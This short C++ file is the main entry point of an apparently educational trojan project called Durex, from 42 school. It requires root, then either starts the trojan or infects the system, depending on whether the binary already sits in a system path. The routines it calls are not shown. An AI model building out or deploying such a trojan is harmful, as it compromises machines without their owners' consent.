/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.cpp                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/09/28 23:42:24 by frmarinh          #+#    #+#             */
/*   Updated: 2017/09/28 23:44:10 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.hpp"
#include "Durex.hpp"

int		main(int argc, char **argv, char **env)
{
	Durex durex(env);

	if (getuid()) {
		return (-1);
	}
	if (durex.isInSystemBinaryPath()) {
		durex.startTrojan();
	} else {
		durex.infectSystem();
	}
}
